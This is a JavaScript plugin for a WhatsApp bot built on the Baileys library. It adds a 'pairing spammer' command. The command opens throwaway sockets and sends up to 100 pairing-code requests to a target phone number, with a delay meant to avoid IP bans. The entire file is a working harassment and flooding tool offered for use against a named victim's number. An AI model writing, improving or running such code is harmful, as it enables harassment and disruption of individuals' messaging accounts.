import { makeWASocket, Browsers } from "baileys";

let handler = async (m, { sock, text, args, usedPrefix, command }) => {
    if (!args[0]) {
        return m.reply(`🎬 *WA PAIRING SPAMMER*\n\n` +
            `Usage: *${usedPrefix + command} [number] [amount]*\n` +
            `Example: *${usedPrefix + command} 628xxxxxxxxxx 100*\n\n` +
            `_Note: Max amount is 100 for safety._`);
    }

    const targetNumber = args[0].replace(/[^0-9]/g, "");
    if (targetNumber.length < 10) {
        return m.reply("❌ Invalid phone number. Please provide a valid number starting with country code (e.g., 628...).");
    }

    let amount = parseInt(args[1]) || 10;
    if (amount > 100) {
        m.reply("⚠️ Amount too high. Capping to 100 for stability.");
        amount = 100;
    }

    try {
        await global.loading(m, sock);
        await m.reply(`⏳ *Processing...* Spamming ${amount} pairing codes to \`${targetNumber}\`.`);

        let count = 0;
        for (let i = 0; i < amount; i++) {
            try {
                // Create a minimal temporary socket
                const tempSock = makeWASocket({
                    auth: {
                        creds: { registered: false },
                        keys: {}
                    },
                    printQRInTerminal: false,
                    logger: {
                        level: "silent",
                        fatal: () => { }, error: () => { }, warn: () => { }, info: () => { }, debug: () => { }, trace: () => { }, child: () => this
                    },
                    browser: Browsers.macOS("Safari")
                });

                // Request pairing code
                await tempSock.requestPairingCode(targetNumber);

                // Cleanup
                tempSock.ws.close();
                count++;

                // Small delay to prevent instant IP ban and CPU spikes
                if (i < amount - 1) {
                    await new Promise(r => setTimeout(r, 1500));
                }
            } catch (err) {
                global.logger.error({ error: err.message }, "SpamPair Core Loop Error");
                // Continue with next attempt
            }
        }

        await m.reply(`✅ *COMPLETED*\n\nSuccessfully sent ${count} pairing codes to \`${targetNumber}\`.\n\n_Generated by Liora Bot_`);

    } catch (e) {
        global.logger.error({ error: e.message, stack: e.stack }, "SpamPair Main Plugin Error");
        m.reply(`❌ An error occurred: ${e.message}`);
    } finally {
        await global.loading(m, sock, true);
    }
};

handler.help = ["spampairwa"];
handler.tags = ["tools"];
handler.command = /^(spampairwa|spampair|pairspam)$/i;

export default handler;
